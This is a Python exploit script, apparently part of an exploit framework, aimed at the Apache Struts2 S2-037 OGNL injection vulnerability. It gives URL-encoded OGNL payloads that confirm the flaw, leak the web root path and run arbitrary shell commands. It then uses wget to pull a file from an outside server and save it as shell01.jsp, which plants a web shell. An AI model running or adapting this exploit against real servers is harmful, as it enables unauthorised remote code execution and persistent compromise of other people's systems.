# coding:utf-8
import sys
from struts2.exp_template import Exploit, Level, session

from conf import config
"""
构造函数需要传递以下参数
url   测试目标的url
exp需要实现的方法为meta_info和exploit
create by swm  2018/06/21
done:
获取webpath
执行shell命令，无法执行echo命令写文件
can do:
执行wget下载文件，下载大文件都行
"""


class S2037(Exploit):

    def meta_info(self):
        return {
            'name': 'S2-037EXP',
            'author': 'swm',
            'date': '2018/06/21'
        }

    # 判断当前网页是否存在漏洞
    def pocurl(self):
        poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23param" \
              "eters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.clos" \
              "e()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323" \
              "B453885F5181F1B624D0B"
        poc_url = self.url + poc
        s = session()
        try:
            res = s.post(poc_url, timeout=4)
            if res.status_code == 200 and "25F9E794323B453885F5181F1B624D0B" in res.content:
                if len(res.content) < 40:  # 34 length
                    return True
                else:
                    return False
            else:
                return False
        except Exception as e:
            self.report("Failed to connection {}".format(poc_url), Level.error)
            return False

    def getwebpath(self):
        webpath = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts" \
                  "2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWri" \
                  "ter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23w" \
                  "r.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f"
        pathurl = self.url + webpath
        s = session()
        try:
            res = s.get(pathurl, timeout=5)
            if res.status_code == 200:
                filepath = res.text.encode('utf-8')
                return filepath
        except Exception as err:
            self.report("Fail to get web file path {}".format(pathurl))
            return False

    def executecmd(self, cmd):
        cmdexp = "/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parame" \
                 "ters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Run" \
                 "time@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23" \
                 "wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServ" \
                 "letResponse&content=16456&command={}"
        commandurl = self.url+cmdexp.format(cmd)
        s = session()
        try:
            r = s.get(commandurl, timeout=5)
            resp = r.text.encode("utf-8")
            return resp
        except:
            return False

    def wgetfile(self, serverurl, filepath):
        cmd = ''' wget {} -O {}shell01.jsp'''.format(serverurl, filepath)
        response = self.executecmd(cmd)
        return response

    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        poc = self.pocurl()
        if poc:
            # 获取webapp的根目录
            webpath = self.getwebpath().strip()
            if webpath:
                serverurl = config['serverurl']
                res = self.wgetfile(serverurl, webpath)
                if res:
                    self.report('wget file {}'.format(res), Level.info)
        return True


if __name__ == '__main__':
    # 测试使用
    url = "http://localhost:8080/orders/4"
    s = S2037(url)
    res = s.exploit()
    print res
    # if len(sys.argv) == 2:
    #     s = S2037(sys.argv[1])
    #     res = s.exploit()
    #     print res
